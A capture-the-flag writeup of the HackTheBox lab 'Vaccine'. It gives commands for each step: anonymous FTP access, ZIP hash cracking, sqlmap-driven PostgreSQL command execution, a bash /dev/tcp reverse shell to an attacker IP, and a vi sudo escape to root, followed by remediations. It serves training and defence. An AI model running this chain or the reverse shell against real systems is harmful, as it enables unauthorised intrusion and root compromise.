# Vaccine — HTB Starting Point Writeup

**Difficulty:** Beginner | **OS:** Linux (Ubuntu) | **Date:** May 2026

**Topics:** FTP Anonymous Login, ZIP Password Cracking, SQL Injection, PostgreSQL RCE, vi GTFOBin

---

## Summary

Vaccine is a Linux-based Starting Point machine on HackTheBox. The attack chain involves anonymous FTP access to retrieve a password-protected ZIP archive containing web application source code with hardcoded credentials, SQL injection via the search parameter leading to PostgreSQL RCE using COPY FROM PROGRAM, and privilege escalation via a misconfigured sudo rule allowing vi to be run as root (GTFOBins).

---

## Reconnaissance

### Nmap Scan

```
nmap -sC -sV -p- --min-rate 5000 <TARGET-IP> -oN vaccine_nmap.txt
```

**Open Ports:**
- 21 — FTP (vsftpd 3.0.3) — Anonymous login allowed
- 22 — SSH (OpenSSH 8.0p1)
- 80 — HTTP (Apache 2.4.41)

---

## Initial Access

### FTP Anonymous Login

```
ftp <TARGET-IP>
Name: anonymous
ftp> ls
ftp> get backup.zip
ftp> bye
```

### ZIP Password Cracking

```
zip2john backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Password cracked. Extracted contents: `index.php` and `style.css`.

Inspecting `index.php` revealed hardcoded credentials:
- **User:** admin
- **Password:** [REDACTED]

### Web Login

Logged into the web application at `http://<TARGET-IP>/` using the recovered credentials.

### SQL Injection Discovery

The search parameter on the catalogue page was vulnerable to SQL injection. Testing a single quote `'` triggered a PHP error confirming the vulnerability.

### sqlmap — PostgreSQL RCE

Capture the session cookie from Burp Suite and run:

```
sqlmap -u 'http://<TARGET-IP>/dashboard.php?search=a' --cookie='PHPSESSID=<REDACTED>' --os-shell
```

sqlmap identified PostgreSQL as the backend and abused `COPY FROM PROGRAM` for OS command execution.

### Reverse Shell

From the sqlmap os-shell, execute:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

Listener on attacker:
```
nc -lvnp 4444
```

Shell received as `postgres`. Stabilized:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## User Flag

```
cat /var/lib/postgresql/user.txt
```

**User Flag:** [REDACTED]

---

## Privilege Escalation

### Sudo Enumeration

```
sudo -l
# (root) NOPASSWD: /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

### vi GTFOBin

Opened vi with sudo, then used the shell escape:

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside vi:
```
:set shell=/bin/sh
:shell
```

Spawned root shell.

```
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```
cat /root/root.txt
```

**Root Flag:** [REDACTED]

---

## Findings

| # | Finding | Severity | CVSSv3 |
|---|---------|----------|--------|
| 1 | Anonymous FTP Access — Sensitive Archive Exposed | High | 7.5 |
| 2 | SQL Injection — PostgreSQL RCE via COPY FROM PROGRAM | Critical | 9.8 |
| 3 | Weak ZIP Archive Password | Medium | 6.2 |
| 4 | Insecure Sudo Rule — vi as Root (GTFOBin) | High | 7.8 |

### Remediations

1. **Disable anonymous FTP.** Require authentication for all FTP access. Remove sensitive files from FTP directories.
2. **Fix SQL Injection.** Use parameterized queries. Restrict PostgreSQL privileges to prevent OS-level command execution.
3. **Use strong archive passwords.** Avoid storing sensitive backups in publicly accessible locations.
4. **Restrict sudo rules.** Never grant sudo access to interactive editors (vi, nano, less). Use `sudoedit` if file editing as root is required.

---

## Key Takeaways

- Always attempt anonymous FTP login during enumeration
- Password-protected archives can be cracked offline with `zip2john` + `john`
- Source code from config/backup files often exposes credentials
- PostgreSQL `COPY FROM PROGRAM` = RCE when SQLi is present
- Always run `sudo -l` immediately after getting a shell
- Interactive editors (vi, nano, less) listed on GTFOBins can escalate to root via sudo

---

## Tools Used

- Nmap
- zip2john, John the Ripper
- Burp Suite
- sqlmap
- Netcat
- GTFOBins
